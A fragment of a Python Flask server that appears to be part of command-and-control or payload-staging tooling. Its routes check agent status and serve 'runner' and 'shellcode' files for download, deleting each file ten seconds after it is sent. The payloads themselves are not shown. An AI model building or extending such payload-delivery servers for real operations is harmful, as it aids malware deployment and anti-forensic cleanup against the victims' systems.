            
        except Exception as e:
            app.logger.error(f"Error in check_agent_status: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()

    

    @app.route('/api/download_runner/<string:runner_name>')
    def download_runner(runner_name):
        import threading
        import time
        runners_dir = os.path.join(app.root_path, 'runners')
        runner_path = os.path.join(runners_dir, runner_name)
        
        if not os.path.exists(runner_path):
            return jsonify({"status": "error", "message": "Runner not found"}), 404
        
        response = send_from_directory(runners_dir, runner_name, as_attachment=True)
        
        def delete_file_later(path, delay=10):
            def delayed_delete():
                time.sleep(delay)
                try:
                    if os.path.exists(path):
                        os.remove(path)
                except Exception as e:
                    app.logger.error(f"Error deleting runner file {path}: {str(e)}")
            threading.Thread(target=delayed_delete).start()
        
        delete_file_later(runner_path)
        return response
    
    @app.route('/api/download_shellcode/<string:shellcode_name>')
    def download_shellcode(shellcode_name):
        import threading
        import time
        shellcode_dir = os.path.join(app.root_path, 'shellcodes')
        shellcode_path = os.path.join(shellcode_dir, shellcode_name)
        
        if not os.path.exists(shellcode_path):
            return jsonify({"status": "error", "message": "Shellcode not found"}), 404
        
        response = send_from_directory(shellcode_dir, shellcode_name, as_attachment=True)
        
        def delete_file_later(path, delay=10):
            def delayed_delete():
                time.sleep(delay)
                try:
                    if os.path.exists(path):
                        os.remove(path)
                except Exception as e:
                    app.logger.error(f"Error deleting shellcode file {path}: {str(e)}")
            threading.Thread(target=delayed_delete).start()
        
        delete_file_later(shellcode_path)
        return response
